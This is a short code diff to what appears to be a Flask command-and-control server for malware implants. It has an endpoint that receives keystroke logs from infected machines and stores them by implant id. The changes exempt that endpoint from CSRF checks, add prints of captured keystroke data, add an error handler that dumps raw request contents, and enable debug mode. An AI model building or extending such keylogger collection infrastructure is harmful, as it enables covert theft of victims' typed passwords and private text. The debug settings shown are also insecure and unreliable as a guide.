@@ -149,9 +149,13 @@ def new_implant():
     return jsonify(db.new_implant())
     
 @app.route("/api/new/keylog", methods=["POST"])
+@csrf.exempt
 def new_keylog():
+    print("in new keyschlawg")
     data = request.data.decode()
     data = data.split("\n")
+    print(data[0])
+    print(data[1])
     id_json = json.loads(data.pop(0))
     implant_id = int(id_json["id"])
     text = " ".join(data)
@@ -159,5 +163,12 @@ def new_keylog():
     print(f"{text}")
     return jsonify(db.new_keylog(text, implant_id))
 
+@app.errorhandler(400)
+def bad_request_error(e):
+    print("Request data:", request.data)
+    print("Request form:", request.form)
+    print("Request JSON:", request.json)
+    return "Bad Request", 400
 if __name__ == "__main__":
+    app.debug=True
     app.run(debug=True)
